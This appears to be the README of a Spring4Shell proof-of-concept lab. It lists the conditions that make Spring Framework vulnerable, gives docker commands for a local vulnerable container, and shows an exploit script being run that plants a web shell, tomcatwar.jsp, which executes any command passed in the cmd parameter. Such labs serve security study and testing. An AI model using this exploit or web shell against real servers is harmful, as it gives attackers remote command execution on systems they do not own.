In order for this vulnerability to be exploited, several conditions must be met
* Use JDK 9 or higher
* Have Apache Tomcat as the servlet container
* Be packaged as a traditional WAR (in contrast to a Spring Boot executable jar)
* Use the spring-webmvc or spring-webflux dependency
* Use Spring framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, or older versions


## Running the application

* Build the docker image

```
docker build . -t springshell-rce-poc
```

* Run the docker container

```
docker run --rm -p 8085:8080 --name springshell-rce-poc springshell-rce-poc
```


## Exploitation steps

```
python exploit-poc.py --url "http://127.0.0.1:8085/"
```
The expected response

```
exploiting
Shell URL:http://127.0.0.1:8085/tomcatwar.jsp?pwd=j&cmd=whoami
```

If you accessed this url, it will run whatever command you want `cmd=<whatyouwant>`

If you ssh the container you will see a new file has been created `tomcatwar.jsp`

```
docker exec -it springshell-rce-poc /bin/bash
ls /usr/local/tomcat/webapps/ROOT
```
